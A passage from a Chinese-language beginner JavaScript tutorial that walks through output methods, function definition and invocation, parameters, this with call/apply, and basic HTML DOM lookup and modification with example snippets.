window.setInterval(匿名函数, 时间毫秒); 在指定的时间毫秒间隔, 不断调用第一个参数传入的匿名函数.</span><br><span class="line">    window.setInterval(function() &#123;</span><br><span class="line">        count++;</span><br><span class="line">        img.src &#x3D; &quot;..&#x2F;img&#x2F;0&quot;+count+&quot;.jpg&quot;;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; 判断</span><br><span class="line">        if (count &#x3D;&#x3D; 8) &#123;</span><br><span class="line">            count &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, 1000);</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="JavaScript-输出"><a href="#JavaScript-输出" class="headerlink" title="JavaScript 输出"></a>JavaScript 输出</h2><p>JavaScript没有任何打印或输出的函数</p><h3 id="JavaScript-显示数据"><a href="#JavaScript-显示数据" class="headerlink" title="JavaScript 显示数据"></a>JavaScript 显示数据</h3><p>JavaScript可以通过不同的方式来输出数据：</p><ul><li>使用**window.alert()**弹出警告框</li><li>使用**document.write()**方法将内容写到HTML中</li><li>使用<strong>innerHTML</strong>写入到HTML元素</li><li>使用**console.log()**写入到浏览器的控制台</li></ul><h4 id="window-alert"><a href="#window-alert" class="headerlink" title="window.alert()"></a>window.alert()</h4><p>你可以弹出警告框来显示数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一个页面&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert(&quot;弹出的警告框要显示的内容&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="document-write"><a href="#document-write" class="headerlink" title="document.write()"></a>document.write()</h4><p>一般用于测试目的，可以将JavaScript直接写在HTML文档中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(Date()); &lt;!--显示时间方法Data()--&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>tips：如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。比如将 document.write(Date())封装在function myFunction()函数中，用按钮<button onclick="myFunction()">点击</button>调用的话，则会覆盖掉原有的已经加载过得内容</p><h4 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML()"></a>innerHTML()</h4><p>如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。<br>请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;我的第一个段落&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML &#x3D; &quot;段落已修改。&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><strong>document.getElementById(“demo”)</strong> 是使用 id 属性来查找 HTML 元素的 JavaScript 代码 。<br><strong>innerHTML = “段落已修改。”</strong> 是用于修改原来元素的 HTML 内容为(innerHTML)的 JavaScript 代码。</p><h4 id="console-log"><a href="#console-log" class="headerlink" title="console.log()"></a>console.log()</h4><p>如果您的浏览器支持调试，你可以使用 console.log() 方法在浏览器中显示 JavaScript 值。</p><p>浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">a &#x3D; 5;</span><br><span class="line">b &#x3D; 6;</span><br><span class="line">c &#x3D; a + b;</span><br><span class="line">console.log(c);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="JS-函数"><a href="#JS-函数" class="headerlink" title="JS 函数"></a>JS 函数</h2><h3 id="JavaScript-函数定义"><a href="#JavaScript-函数定义" class="headerlink" title="JavaScript 函数定义"></a>JavaScript 函数定义</h3><h4 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h4><p>函数是命名的独立的语句段，这个语句段可以被当作一个整体来引用和执行：</p><p>格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function 函数名(形式参数)&#123;函数体&#125;</span><br><span class="line"></span><br><span class="line">调用函数：函数名(实际参数);</span><br></pre></td></tr></table></figure><hr><p>1、函数只有被调用后才会执行<br>2、如果函数需要返回值、直接使用return 返回、不会像java一样要考虑返回值的类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 定义一个函数 : function</span><br><span class="line">    function demo1() &#123;</span><br><span class="line">        return 50;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 调用函数 :</span><br><span class="line">    alert(demo1()); &#x2F;&#x2F;出现内容为50的弹窗</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><hr><p>3、如果函数需要传递参数、不需要指定参数的类型、直接使用变量即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 定义一个函数 : function</span><br><span class="line">    function demo2(a, b) &#123;</span><br><span class="line">        return a * b;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 调用函数 :</span><br><span class="line">    alert(demo2(5,10));&#x2F;&#x2F;显示50</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><hr><p>4、js中出现二个重名的函数名、后者会把前面的覆盖掉<br>对比java、java有重载（同名不同参）、重写（同名同参同返回值类型、方法体不一样）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 定义一个函数 : function</span><br><span class="line">    function demo4(a, b) &#123;</span><br><span class="line">        alert(&quot;调用1...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   function demo4() &#123;</span><br><span class="line">       alert(&quot;调用2...&quot;);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">    demo4(10, 20);</span><br><span class="line">    demo4();</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><p>解释：匿名函数是没有名字的函数。在函数表达式存储在变量后，变量也可作为一个函数使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function(形式参数)&#123;函数体&#125;</span><br><span class="line"></span><br><span class="line">调用方式：将匿名函数赋值给一个变量，通过变量名调用函数</span><br><span class="line"></span><br><span class="line">定义函数并赋值给变量：var x &#x3D; function(形式参数)&#123;函数体&#125;</span><br><span class="line">调用函数：x(实际参数);</span><br></pre></td></tr></table></figure><p>演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 匿名函数 : 没有名称的函数</span><br><span class="line">    var x &#x3D; function(a, b) &#123;</span><br><span class="line">        return a*b;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 调用函数 :</span><br><span class="line">   alert(x(5, 10));&#x2F;&#x2F;弹窗显示50</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="自调用函数"><a href="#自调用函数" class="headerlink" title="自调用函数"></a>自调用函数</h4><p>如果表达式后面紧跟 () ，则会自动调用。<br>不能自调用声明的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function () &#123;</span><br><span class="line">    var x &#x3D; &quot;Hello!!&quot;;      &#x2F;&#x2F; 我将调用自己</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>以上函数实际上是一个 匿名自我调用的函数 (没有函数名)。</p><h4 id="函数可作为一个值使用"><a href="#函数可作为一个值使用" class="headerlink" title="函数可作为一个值使用"></a>函数可作为一个值使用</h4><p>JavaScript 函数作为一个值使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var x &#x3D; myFunction(4, 3);</span><br></pre></td></tr></table></figure><p>也可以作为表达式使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var x &#x3D; myFunction(4, 3) * 2;</span><br></pre></td></tr></table></figure><h4 id="函数是对象"><a href="#函数是对象" class="headerlink" title="函数是对象"></a>函数是对象</h4><p>JavaScript 函数有 属性 和 方法</p><p>arguments.length 属性返回函数调用过程接收到的参数个数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">    return arguments.length; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>toString() 方法将函数作为一个字符串返回:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var txt &#x3D; myFunction.toString();</span><br></pre></td></tr></table></figure><h3 id="Js-函数的参数"><a href="#Js-函数的参数" class="headerlink" title="Js 函数的参数"></a>Js 函数的参数</h3><h4 id="显示参数（Parameters）"><a href="#显示参数（Parameters）" class="headerlink" title="显示参数（Parameters）"></a>显示参数（Parameters）</h4><ul><li>显示参数在函数定义时被列出</li><li>JavaScript 函数定义显式参数时没有指定数据类型</li></ul><p>默认参数<br>ES5 中如果函数在调用时未提供隐式参数，参数会默认设置为： undefined</p><p>有时这是可以接受的，但是建议最好为参数设置一个默认值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">实例(ES5)</span><br><span class="line">function myFunction(x, y) &#123;</span><br><span class="line">    if (y &#x3D;&#x3D;&#x3D; undefined) &#123;</span><br><span class="line">          y &#x3D; 0;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 调用函数</span><br><span class="line">alert(myFunction(4))  &#x2F;&#x2F; 弹窗显示0</span><br></pre></td></tr></table></figure><p><strong>ES6 函数可以自带参数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">实例（ES6）</span><br><span class="line">function myFunction(x, y &#x3D; 10) &#123;</span><br><span class="line">    &#x2F;&#x2F; y is 10 if not passed or undefined</span><br><span class="line">    return x + y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myFunction(0, 2) &#x2F;&#x2F; 输出 2</span><br><span class="line">myFunction(5); &#x2F;&#x2F; 输出 15, y 参数的默认值</span><br></pre></td></tr></table></figure><h4 id="隐式参数（Arguments）"><a href="#隐式参数（Arguments）" class="headerlink" title="隐式参数（Arguments）"></a>隐式参数（Arguments）</h4><ul><li>隐式参数在函数调用是传递给函数真正的值</li><li>JavaScript 函数对隐式参数没有进行类型检测。</li><li>JavaScript 函数对隐式参数的个数没有进行检测。</li></ul><p><strong>arguments 对象</strong><br>JavaScript 函数有个内置的对象 arguments 对象。</p><p>argument 对象包含了函数调用的参数数组。</p><p>通过这种方式你可以很方便的找到最大的一个参数的值:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">实例：</span><br><span class="line"></span><br><span class="line">x &#x3D; findMax(1, 123, 500, 115, 44, 88);</span><br><span class="line"> </span><br><span class="line">function findMax() &#123;</span><br><span class="line">    var i, max &#x3D; arguments[0];</span><br><span class="line">    </span><br><span class="line">    if(arguments.length &lt; 2) return max;</span><br><span class="line"> </span><br><span class="line">    for (i &#x3D; 0; i &lt; arguments.length; i++) &#123;</span><br><span class="line">        if (arguments[i] &gt; max) &#123;</span><br><span class="line">            max &#x3D; arguments[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过值传递参数</strong><br>在函数中调用的参数是函数的隐式参数。</p><p>JavaScript 隐式参数通过值来传递：函数仅仅只是获取值。</p><p>如果函数修改参数的值，不会修改显式参数的初始值（在函数外定义）。</p><p>隐式参数的改变在函数外是不可见的。</p><p><strong>通过对象传递参数</strong><br>在JavaScript中，可以引用对象的值。</p><p>因此我们在函数内部修改对象的属性就会修改其初始的值。</p><p>修改对象属性可作用于函数外部（全局变量）。</p><p>修改对象属性在函数外是可见的。</p><h3 id="JavaScript-函数调用"><a href="#JavaScript-函数调用" class="headerlink" title="JavaScript 函数调用"></a>JavaScript 函数调用</h3><p>JavaScript函数有4中调用方式<br>每种方式不用在于this的初始化</p><p><strong>this关键字</strong><br>一般而言，在Javascript中，this指向函数执行时的当前对象。<br>注意 this 是保留关键字，你不能修改 this 的值。</p><h4 id="作为函数调用"><a href="#作为函数调用" class="headerlink" title="作为函数调用"></a>作为函数调用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br><span class="line">myFunction(10, 2);           &#x2F;&#x2F; myFunction(10, 2) 返回 20</span><br><span class="line">&#x2F;&#x2F; window.myFunction(10, 2);    &#x2F;&#x2F; window.myFunction(10, 2) 返回 20</span><br></pre></td></tr></table></figure><p>以上函数不属于任何对象。但是在 JavaScript 中它始终是默认的全局对象。</p><p>在 HTML 中默认的全局对象是 HTML 页面本身，所以函数是属于 HTML 页面。</p><p>在浏览器中的页面对象是浏览器窗口(window 对象)。以上函数会自动变为 window 对象的函数。</p><p>myFunction() 和 window.myFunction() 是一样的：</p><h4 id="作为方法调用"><a href="#作为方法调用" class="headerlink" title="作为方法调用"></a>作为方法调用</h4><p>在 JavaScript 中你可以将函数定义为对象的方法。</p><p>以下实例创建了一个对象 (myObject), 对象有两个属性 (firstName 和 lastName), 及一个方法 (fullName):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">var myObject &#x3D; &#123;</span><br><span class="line">    firstName:&quot;John&quot;,</span><br><span class="line">    lastName: &quot;Doe&quot;,</span><br><span class="line">    fullName: function () &#123;</span><br><span class="line">        return this.firstName + &quot; &quot; + this.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObject.fullName();         &#x2F;&#x2F; 返回 &quot;John Doe&quot;</span><br></pre></td></tr></table></figure><p>tips: 函数作为对象方法调用，会使得 this 的值成为对象本身。</p><h4 id="使用构造函数调用函数"><a href="#使用构造函数调用函数" class="headerlink" title="使用构造函数调用函数"></a>使用构造函数调用函数</h4><p>如果函数调用前使用了 new 关键字, 则是调用了构造函数。<br>这看起来就像创建了新的函数，但实际上 JavaScript 函数是重新创建的对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 构造函数:</span><br><span class="line">function myFunction(arg1, arg2) &#123;</span><br><span class="line">    this.firstName &#x3D; arg1;</span><br><span class="line">    this.lastName  &#x3D; arg2;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; This    creates a new object</span><br><span class="line">var x &#x3D; new myFunction(&quot;John&quot;,&quot;Doe&quot;);</span><br><span class="line">x.firstName;                             &#x2F;&#x2F; 返回 &quot;John&quot;</span><br></pre></td></tr></table></figure><p>构造函数的调用会创建一个新的对象。新对象会继承构造函数的属性和方法。</p><p>tips: 构造函数中 this 关键字没有任何的值。this 的值在函数调用实例化对象(new object)时创建。</p><h4 id="作为函数方法调用函数"><a href="#作为函数方法调用函数" class="headerlink" title="作为函数方法调用函数"></a>作为函数方法调用函数</h4><p>在 JavaScript 中, 函数是对象。JavaScript 函数有它的属性和方法。<br>call() 和 apply() 是预定义的函数方法。 两个方法可用于调用函数，两个方法的第一个参数必须是对象本身。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br><span class="line">myObject &#x3D; myFunction.call(myObject, 10, 2);     &#x2F;&#x2F; 返回 20</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br><span class="line">myArray &#x3D; [10, 2];</span><br><span class="line">myObject &#x3D; myFunction.apply(myObject, myArray);  &#x2F;&#x2F; 返回 20</span><br></pre></td></tr></table></figure><p>两个方法都使用了对象本身作为第一个参数。 两者的区别在于第二个参数： apply传入的是一个参数数组，也就是将多个参数组合成为一个数组传入，而call则作为call的参数传入（从第二个参数开始）。</p><p>在 JavaScript 严格模式(strict mode)下, 在调用函数时第一个参数会成为 this 的值， 即使该参数不是一个对象。</p><p>在 JavaScript 非严格模式(non-strict mode)下, 如果第一个参数的值是 null 或 undefined, 它将使用全局对象替代。</p><p>tips:通过 call() 或 apply() 方法你可以设置 this 的值, 且作为已存在对象的新方法调用。</p><h2 id="JavaScript-HTML-DOM"><a href="#JavaScript-HTML-DOM" class="headerlink" title="JavaScript HTML DOM"></a>JavaScript HTML DOM</h2><p>通过 HTML DOM，可访问 JavaScript HTML 文档的所有元素。</p><h3 id="DOM-简介"><a href="#DOM-简介" class="headerlink" title="DOM 简介"></a>DOM 简介</h3><p><strong>HTML DOM (文档对象模型)</strong><br>当网页被加载时，浏览器会创建页面的文档对象模型（Document Object Model）。</p><ul><li>JavaScript 能够改变页面中的所有 HTML 元素</li><li>JavaScript 能够改变页面中的所有 HTML 属性</li><li>JavaScript 能够改变页面中的所有 CSS 样式</li><li>JavaScript 能够对页面中的所有事件做出反应</li></ul><h4 id="查找HTML元素"><a href="#查找HTML元素" class="headerlink" title="查找HTML元素"></a>查找HTML元素</h4><p>通常，通过 JavaScript，您需要操作 HTML 元素。<br>为了做到这件事情，您必须首先找到该元素。有三种方法来做这件事：</p><ul><li>通过id找到HTML元素</li><li>通过标签名找到 HTML 元素</li><li>通过类名找到 HTML 元素</li></ul><p><strong>通过 id 查找 HTML 元素</strong><br>最简单，最常用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如： 查找&lt;p id&#x3D;&quot;demo&quot;&gt;</span><br><span class="line">var x&#x3D;document.getElementById(&quot;demo&quot;);</span><br></pre></td></tr></table></figure><p><strong>通过标签名查找 HTML 元素</strong><br>本例查找 id=”main” 的元素，然后查找 id=”main” 元素中的所有 <p> 元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var x&#x3D;document.getElementById(&quot;main&quot;);</span><br><span class="line">var y&#x3D;x.getElementsByTagName(&quot;p&quot;);</span><br></pre></td></tr></table></figure><p><strong>通过类名找到 HTML 元素</strong><br>查找 class=”intro” 的元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x&#x3D;document.getElementsByClassName(&quot;intro&quot;);</span><br></pre></td></tr></table></figure><h3 id="DOM-HTML（改变HTML）"><a href="#DOM-HTML（改变HTML）" class="headerlink" title="DOM HTML（改变HTML）"></a>DOM HTML（改变HTML）</h3><p>HTML DOM 允许 JavaScript 改变 HTML 元素的内容。</p><h4 id="改变HTML输出流"><a href="#改变HTML输出流" class="headerlink" title="改变HTML输出流"></a>改变HTML输出流</h4><p>在 JavaScript 中，document.write() 可用于直接向 HTML 输出流写内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(Date());</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="改变HTML内容"><a href="#改变HTML内容" class="headerlink" title="改变HTML内容"></a>改变HTML内容</h4><p>修改 HTML 内容的最简单的方法是使用 innerHTML 属性。<br>如需改变 HTML 元素的内容，请使用这个语法：<br><code>document.getElementById(id).innerHTML=新的 HTML</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">本例改变了 &lt;p&gt;元素的内容：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;Hello World!&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;p1&quot;).innerHTML&#x3D;&quot;新文本!&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="改变HTML属性"><a href="#改变HTML属性" class="headerlink" title="改变HTML属性"></a>改变HTML属性</h4><p>如需改变 HTML 元素的属性，请使用这个语法：<br><code>document.getElementById(id).attribute=新属性值</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">改变&lt;img&gt;元素的src属性</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;img id&#x3D;&quot;image&quot; src&#x3D;&quot;smiley.gif&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span 